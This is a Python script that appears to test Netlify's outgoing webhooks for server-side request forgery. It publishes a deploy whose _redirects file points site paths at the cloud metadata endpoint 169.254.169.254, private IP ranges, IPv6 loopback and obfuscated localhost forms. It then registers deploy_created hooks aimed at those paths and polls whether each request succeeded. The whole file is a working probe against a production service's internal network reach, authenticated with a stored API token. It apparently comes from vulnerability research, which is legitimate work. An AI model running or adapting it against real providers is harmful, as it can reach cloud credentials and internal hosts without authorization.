# -*- coding: utf-8 -*-
# _hk_matrix2.py - rebuild hooks on deploy_created event, fire via zip deploy, poll long
import sys, os, json, time, hashlib, urllib.request, urllib.error

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _net_creds import TOKEN_B

SITE_B = "d2977de0-d24d-4544-81cb-933e610cad7d"
SITE_B_DOMAIN = "sec-b-08v4pk.netlify.app"
API = "https://api.netlify.com/api/v1"

def req(method, url, tok=None, body=None, raw_body=None, ctype=None, timeout=40):
    r = urllib.request.Request(url, method=method)
    if tok:
        r.add_header("Authorization", "Bearer " + tok)
    data = None
    if raw_body is not None:
        data = raw_body
        r.add_header("Content-Type", ctype or "application/octet-stream")
    elif body is not None:
        data = json.dumps(body).encode()
        r.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(r, data=data, timeout=timeout) as resp:
            b = resp.read(40000)
            try:
                return resp.status, json.loads(b.decode("utf-8", "replace"))
            except Exception:
                return resp.status, b[:1000]
    except urllib.error.HTTPError as e:
        b = e.read(4000)
        try:
            return e.code, json.loads(b.decode("utf-8", "replace"))
        except Exception:
            return e.code, b[:400]
    except Exception as ex:
        return -1, str(ex)[:250]

targets = {
    "ctl":   "https://%s/index.html" % SITE_B_DOMAIN,
    "meta":  "http://169.254.169.254/latest/meta-data/",
    "m100":  "http://169.254.100.5/x",
    "r10":   "http://10.0.0.1/x",
    "r172":  "http://172.16.0.1/x",
    "r192":  "http://192.168.1.1/x",
    "v6l":   "http://[::1]/x",
    "v6u":   "http://[fd00::1]/x",
    "hex":   "http://0x7f000001/x",
    "int":   "http://2130706433/x",
    "nip":   "http://169.254.169.254.nip.io/x",
    "pub":   "https://api.netlify.com/api/v1/",
}
redir_lines = ["/hm_%s/*  %s  302" % (k, t) for k, t in targets.items()]
redir = ("\n".join(redir_lines) + "\n").encode()
html = b"<html><body>matrix2</body></html>"
files = {"/index.html": hashlib.sha1(html).hexdigest(),
         "/_redirects": hashlib.sha1(redir).hexdigest()}

# 1) delete old deploy_locked hooks
old = json.load(open(r"D:\scan\netlify_report\_hk_matrix_ids.json"))
for k, hid in old.items():
    s, _ = req("DELETE", API + "/hooks/%s" % hid, tok=TOKEN_B)
    print("del old %s: %s" % (k, s), flush=True)
# also delete the very first meta/ctl pair if still around
try:
    old2 = json.load(open(r"D:\scan\netlify_report\_hk_ids2.txt"))
    for name, hid in old2.items():
        req("DELETE", API + "/hooks/%s" % hid, tok=TOKEN_B)
except Exception as ex:
    print("cleanup ids2:", ex, flush=True)

# 2) create deploy_created hooks
hook_ids = {}
for k in targets:
    u = "https://%s/hm_%s/x" % (SITE_B_DOMAIN, k)
    s, h = req("POST", API + "/hooks?site_id=%s" % SITE_B, tok=TOKEN_B,
               body={"type": "url", "event": "deploy_created", "data": {"url": u}})
    if isinstance(h, dict) and h.get("id"):
        hook_ids[k] = h["id"]
    else:
        print("create %s -> %s %r" % (k, s, h)[:200], flush=True)
print("hooks created:", len(hook_ids), flush=True)
json.dump(hook_ids, open(r"D:\scan\netlify_report\_hk_matrix2_ids.json", "w"))

# 3) zip deploy to fire deploy_created
s, d = req("POST", API + "/sites/%s/deploys" % SITE_B, tok=TOKEN_B,
           body={"title": "ssrf-matrix2", "files": files})
DID = d.get("id") if isinstance(d, dict) else None
print("deploy:", s, DID, flush=True)
if not DID:
    sys.exit(1)
for path, content in (("/index.html", html), ("/_redirects", redir)):
    req("PUT", API + "/deploys/%s/files%s" % (DID, path), tok=TOKEN_B,
        raw_body=content, ctype="application/octet-stream")
s, dd = req("PUT", API + "/sites/%s/deploys/%s" % (SITE_B, DID), tok=TOKEN_B, body={"state": "published"})
print("publish:", s, flush=True)
print("DID=%s waiting for deploy_created..." % DID, flush=True)

# 4) long poll (60 x 10s)
seen = {}
for i in range(60):
    time.sleep(10)
    rows = []
    for k, hid in hook_ids.items():
        s, h = req("GET", API + "/hooks/%s" % hid, tok=TOKEN_B)
        if isinstance(h, dict):
            st = "OK" if h.get("success") is True else ("-" if h.get("success") is None else "F")
            fl = "d" if h.get("disabled") else ""
            rows.append("%s=%s%s" % (k, st, fl))
            prev = seen.get(k)
            cur = (h.get("success"), h.get("disabled"))
            if prev != cur:
                seen[k] = cur
                rows[-1] = rows[-1] + "*"
        else:
            rows.append("%s=ERR" % k)
    print("poll %d: %s" % (i, " ".join(rows)), flush=True)
    # early stop when every hook has success != None
    if len(seen) == len(hook_ids) and all(v[0] is not None for v in seen.values()):
        print("ALL SET", flush=True)
        break
print("DONE", flush=True)
